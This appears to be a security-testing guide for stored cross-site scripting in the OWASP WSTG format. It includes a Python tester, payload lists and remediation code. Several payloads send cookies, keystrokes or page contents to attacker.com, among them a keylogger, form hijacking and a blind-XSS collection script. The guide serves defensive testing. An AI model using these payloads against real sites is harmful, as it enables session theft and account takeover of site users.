# WSTG-INPV-02: Testing for Stored Cross-Site Scripting (XSS)

## Test ID
WSTG-INPV-02

## Test Name
Testing for Stored Cross-Site Scripting (XSS)

## High-Level Description

Stored XSS (Persistent XSS) occurs when user input is permanently stored on the target server and later displayed to other users without proper sanitization. This is more dangerous than reflected XSS because it affects all users who view the infected page and doesn't require social engineering to trick users into clicking malicious links.

---

## What to Check

- [ ] User profile fields (name, bio, etc.)
- [ ] Comments and posts
- [ ] Forum messages
- [ ] File uploads (SVG, HTML)
- [ ] Email functionality
- [ ] Log viewers
- [ ] Support tickets
- [ ] Product reviews

---

## How to Test

### Step 1: Identify Storage Points

```bash
#!/bin/bash
# Find areas where user input is stored and displayed

TARGET="https://target.com"

# Common stored XSS vectors
VECTORS=(
    "/profile"
    "/comments"
    "/posts"
    "/messages"
    "/reviews"
    "/support"
    "/feedback"
    "/forum"
)

for vector in "${VECTORS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$vector")
    if [ "$status" == "200" ]; then
        echo "[*] Found potential storage point: $vector"
    fi
done
```

### Step 2: Stored XSS Tester

```python
#!/usr/bin/env python3
"""
Stored XSS Vulnerability Tester
"""

import requests
import time
import re
from urllib.parse import urljoin

class StoredXSSTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []
        self.session = requests.Session()

    # Payloads for stored XSS
    PAYLOADS = [
        # Basic
        '<script>alert("StoredXSS")</script>',
        '<img src=x onerror=alert("StoredXSS")>',
        '<svg/onload=alert("StoredXSS")>',

        # Delayed execution
        '<img src="x" onerror="setTimeout(function(){alert(1)},1000)">',

        # Cookie stealing
        '<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>',
        '<img src=x onerror="fetch(\'https://attacker.com/?\'+document.cookie)">',

        # Keylogger
        '<script>document.onkeypress=function(e){new Image().src="https://attacker.com/log?k="+e.key}</script>',

        # Form hijacking
        '<script>document.forms[0].action="https://attacker.com/steal"</script>',

        # Stored in different contexts
        '"><script>alert(1)</script>',
        "'-alert(1)-'",

        # Polyglot
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    ]

    def test_comment_section(self, post_url, view_url):
        """Test comment functionality for stored XSS"""
        print(f"\n[*] Testing comment section...")

        for payload in self.PAYLOADS:
            # Unique identifier to track this payload
            identifier = f"stored_{hash(payload) % 10000}"
            test_payload = payload.replace('alert(1)', f'alert("{identifier}")')

            # Submit comment
            data = {
                'comment': test_payload,
                'name': 'Test User',
                'email': 'test@test.com'
            }

            try:
                post_response = self.session.post(post_url, data=data)

                # Check if stored
                time.sleep(1)
                view_response = self.session.get(view_url)

                if test_payload in view_response.text or identifier in view_response.text:
                    print(f"[VULN] Stored XSS in comments!")
                    print(f"  Payload: {payload[:50]}")
                    self.findings.append({
                        'location': 'Comments',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return  # Found, stop testing

            except Exception as e:
                pass

    def test_profile_fields(self, profile_url, view_url):
        """Test profile fields for stored XSS"""
        print(f"\n[*] Testing profile fields...")

        fields = ['name', 'bio', 'website', 'location', 'company', 'about']

        for field in fields:
            for payload in self.PAYLOADS[:5]:  # Test subset
                data = {field: payload}

                try:
                    # Update profile
                    self.session.post(profile_url, data=data)

                    # View profile
                    time.sleep(1)
                    response = self.session.get(view_url)

                    if payload in response.text:
                        print(f"[VULN] Stored XSS in profile field: {field}")
                        self.findings.append({
                            'location': f'Profile - {field}',
                            'payload': payload,
                            'severity': 'High'
                        })
                        break

                except Exception as e:
                    pass

    def test_file_upload(self, upload_url, view_url):
        """Test file upload for stored XSS (SVG, HTML)"""
        print(f"\n[*] Testing file upload for XSS...")

        # SVG XSS payload
        svg_payload = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">
      alert("StoredXSS_SVG");
   </script>
</svg>'''

        # HTML payload
        html_payload = '''<html>
<body>
<script>alert("StoredXSS_HTML")</script>
</body>
</html>'''

        files_to_test = [
            ('test.svg', svg_payload, 'image/svg+xml'),
            ('test.html', html_payload, 'text/html'),
            ('test.htm', html_payload, 'text/html'),
        ]

        for filename, content, content_type in files_to_test:
            try:
                files = {'file': (filename, content, content_type)}
                response = self.session.post(upload_url, files=files)

                if response.status_code == 200:
                    # Try to find and access uploaded file
                    # This depends on the application
                    print(f"[INFO] Uploaded {filename}, check if XSS executes")
                    self.findings.append({
                        'location': f'File Upload - {filename}',
                        'payload': 'SVG/HTML with embedded script',
                        'severity': 'Medium',
                        'note': 'Manual verification required'
                    })

            except Exception as e:
                pass

    def test_message_system(self, send_url, inbox_url):
        """Test messaging system for stored XSS"""
        print(f"\n[*] Testing message system...")

        for payload in self.PAYLOADS[:5]:
            data = {
                'to': 'victim@example.com',
                'subject': payload,
                'message': payload
            }

            try:
                self.session.post(send_url, data=data)

                time.sleep(1)
                response = self.session.get(inbox_url)

                if payload in response.text:
                    print(f"[VULN] Stored XSS in messages!")
                    self.findings.append({
                        'location': 'Messages',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return

            except Exception as e:
                pass

    def test_admin_interfaces(self, log_url):
        """Test if XSS can be stored in admin-visible areas"""
        print(f"\n[*] Testing admin-visible areas (blind stored XSS)...")

        # User-Agent based stored XSS
        blind_payloads = [
            '<script src="https://xsshunter.com/probe.js"></script>',
            '<img src=x onerror="fetch(\'https://attacker.com/blind?\'+document.cookie)">',
        ]

        for payload in blind_payloads:
            headers = {
                'User-Agent': payload,
                'Referer': payload,
                'X-Forwarded-For': payload
            }

            try:
                self.session.get(self.base_url, headers=headers)
                print(f"  [INFO] Injected via headers - check XSS Hunter for callbacks")
            except:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("STORED XSS VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo stored XSS vulnerabilities found.")
        else:
            print(f"\nFound {len(self.findings)} vulnerabilities:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['location']}")
                print(f"  Payload: {f['payload'][:60]}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")
                print()

    def run_tests(self, auth_cookies=None):
        """Run all stored XSS tests"""
        if auth_cookies:
            self.session.cookies.update(auth_cookies)

        # Test various storage points
        self.test_comment_section(
            f"{self.base_url}/comment/submit",
            f"{self.base_url}/comments"
        )

        self.test_profile_fields(
            f"{self.base_url}/profile/update",
            f"{self.base_url}/profile"
        )

        self.test_file_upload(
            f"{self.base_url}/upload",
            f"{self.base_url}/files"
        )

        self.test_message_system(
            f"{self.base_url}/message/send",
            f"{self.base_url}/inbox"
        )

        self.test_admin_interfaces(f"{self.base_url}/logs")

        self.generate_report()

# Usage
tester = StoredXSSTester("https://target.com")
tester.run_tests(auth_cookies={'session': 'your_session_cookie'})
```

### Step 3: Blind Stored XSS Detection

```javascript
// XSS Hunter style payload
// Creates callback when XSS fires
"><script src=https://yourxsshunter.xss.ht></script>
<img src=x onerror="var i=new Image();i.src='https://yourserver.com/xss?cookie='+btoa(document.cookie)+'&url='+btoa(document.URL)">

// Self-contained callback
<script>
(function(){
    var exfil = 'https://attacker.com/collect?';
    exfil += 'cookie=' + encodeURIComponent(document.cookie);
    exfil += '&url=' + encodeURIComponent(document.URL);
    exfil += '&dom=' + encodeURIComponent(document.body.innerHTML.substring(0,500));
    new Image().src = exfil;
})();
</script>
```

### Step 4: SVG XSS Payloads

```xml
<!-- Basic SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- SVG with embedded script -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>

<!-- SVG with use element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
</svg>

<!-- SVG foreignObject -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

---

## Tools

| Tool | Purpose |
|------|---------|
| XSS Hunter | Blind XSS detection |
| Burp Collaborator | Out-of-band detection |
| BeEF | Browser exploitation framework |
| XSStrike | XSS detection |
| Dalfox | XSS scanner |

---

## Remediation

```python
# Python - Input sanitization and output encoding
import bleach
from markupsafe import escape

# Sanitize HTML input (allow safe tags)
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

def sanitize_input(user_input):
    return bleach.clean(
        user_input,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

# Always encode output
def render_user_content(content):
    return escape(content)

# Content Security Policy
@app.after_request
def add_csp(response):
    csp = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    response.headers['Content-Security-Policy'] = csp
    return response
```

```javascript
// JavaScript - Safe rendering
// Use textContent instead of innerHTML
element.textContent = userInput;

// If HTML is needed, use DOMPurify
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
});
element.innerHTML = clean;
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Stored XSS in public area | 8.1 | High |
| Stored XSS in user profile | 7.5 | High |
| Stored XSS in admin panel | 9.0 | Critical |
| Stored XSS via file upload | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |

---

## References

- [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [XSS Hunter](https://xsshunter.com/)

---

## Checklist

```
[ ] Comment sections tested
[ ] User profiles tested
[ ] File upload tested (SVG, HTML)
[ ] Message systems tested
[ ] Log viewers tested (blind XSS)
[ ] Multiple contexts tested
[ ] Filter bypasses attempted
[ ] Findings documented
```
